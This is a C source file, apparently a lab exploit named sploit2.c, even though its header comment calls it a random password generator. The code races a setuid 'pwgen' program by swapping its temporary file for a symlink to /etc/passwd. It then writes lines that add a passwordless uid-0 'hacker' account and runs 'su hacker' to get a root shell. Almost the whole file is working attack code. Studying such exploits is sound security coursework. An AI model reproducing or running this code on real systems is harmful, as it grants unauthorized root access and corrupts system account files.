/*
 * A program that randomly generates a password and sets that as your 
password
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

#define BUFFER 1000
#define PASS_SIZE 8
#define TEMP_FILENAME "/tmp/pwgen_random"
#define PASSWD_FILENAME "/etc/passwd"

// cd /share && gcc -Wall -ggdb sploit2.c -o /home/user/sploit2 && ~/sploit2
// Main
int main(int argc, char* argv[]) {
    // FILE *output;
    // char msg[1024];
    // char buffer[BUFFER];
    // char pass[PASS_SIZE+1];
    int ret;
    char *binary = "/usr/local/bin/pwgen";
    char *input_str =   "::38:38:Mailing List Manager:/var/list:/bin/sh\n"
                        "root:x:0:0:root:/root:/bin/bash\n"
                        "user::1000:1000:root:/root:/bin/bash\n"
                        "hacker::0:0:root:/root:/bin/bash\n"
                        "halt::0:1001::/:/sbin/halt\n"; 
//prepare an input string
    char *cmd[] = { binary, "-e", (char *)0 };
    char *env[] = { "HOME=/home/user", (char *)0 };

    // currently, we are trying to run an example code and see if it works
    int fd1[2];  // communication pipe


    // fd[0]-> for using read end
    // fd[1]-> for using write end

    pid_t pid; // fork process id, = 0 means child, else means parent
    if (pipe(fd1) == -1) {
        fprintf(stderr, "Pipe Failed");
        return 1;
    }
    // unlink(TEMP_FILENAME);
    pid = fork();
    if (pid < 0) {
        fprintf(stderr, "fork Failed");
        return 1;
    } else if (pid == 0) { // child
        // within child, we write to parent. because of this, we never needed the read end
        dup2(fd1[0], STDIN_FILENO);  // Error check omitted, hooking up child output to parent stdin
        // dup2(fd2[1], STDOUT_FILENO);  // Error check omitted, hooking up child output to parent stdin
        close(fd1[1]); // we never write, closing the write end
        ret = execve(binary, cmd, env);
        printf("you are not suppose to be here \n"); // we are never suppose to reach this line, if we do, exception
   

    } else { // parent
        // within parent, we listen to kids providing us input, thus 

        printf("we are puting the writer to sleep for a few seconds, until it has created and verify the file \n");
        sleep(5); // format is sleep(x); where x is # of seconds.
        printf("we should be prompt for input, modifying the tmp/pwgen_random to point to /etc/passwd\n");
        unlink(TEMP_FILENAME);
        symlink(PASSWD_FILENAME, TEMP_FILENAME);
        printf("symlink created! now let input the new /etc/passwd to enable root access\n");
        write(fd1[1], input_str, strlen(input_str) + 1); // write it to the pipe
        close(fd1[1]); // is sleep(x); where x is # of seconds.

        printf("we have inserted a hacker user with root access into /etc/passwd! now su hacker to open root terminal\n");
        printf("we also wait a few seconds for pwgen to compelete the write\n");
        sleep(5); // format        close(fd1[1]);
        system("su hacker");
        printf("hack completed!\n");
    }

    return 0;
}
